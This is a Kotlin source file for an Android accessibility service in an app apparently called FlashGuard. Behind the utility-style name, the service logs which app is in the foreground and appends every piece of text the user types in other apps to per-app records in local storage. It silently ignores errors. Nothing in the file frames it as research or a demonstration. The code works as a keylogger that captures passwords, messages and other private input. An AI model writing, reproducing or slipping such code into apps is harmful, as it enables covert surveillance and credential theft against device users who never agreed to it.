package com.flashguard.flashguard

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.SharedPreferences
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class FlashGuardAccessibility : AccessibilityService() {

    private val prefs: SharedPreferences by lazy {
        applicationContext.getSharedPreferences("fg_acc", MODE_PRIVATE)
    }

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo()
        info.eventTypes =
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
            AccessibilityEvent.TYPE_VIEW_FOCUSED or
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
        info.feedbackType     = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.notificationTimeout = 100
        info.flags            =
            AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
            AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        serviceInfo = info
        prefs.edit().putBoolean("enabled", true).apply()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        try {
            when (event.eventType) {

                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    val pkg = event.packageName?.toString() ?: return
                    if (pkg == packageName) return
                    val cls = event.className?.toString() ?: ""
                    prefs.edit()
                        .putString("last_app", pkg)
                        .putString("last_cls", cls)
                        .putLong("last_app_ts", System.currentTimeMillis())
                        .apply()
                }

                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val pkg  = event.packageName?.toString() ?: return
                    if (pkg == packageName) return
                    val text = event.text?.joinToString("") ?: return
                    if (text.isBlank()) return
                    val key  = "key_${pkg.replace('.', '_')}"
                    val prev = prefs.getString(key, "") ?: ""
                    prefs.edit().putString(key, "$prev$text|").apply()
                }

                else -> {}
            }
        } catch (_: Exception) {}
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        prefs.edit().putBoolean("enabled", false).apply()
        super.onDestroy()
    }
}
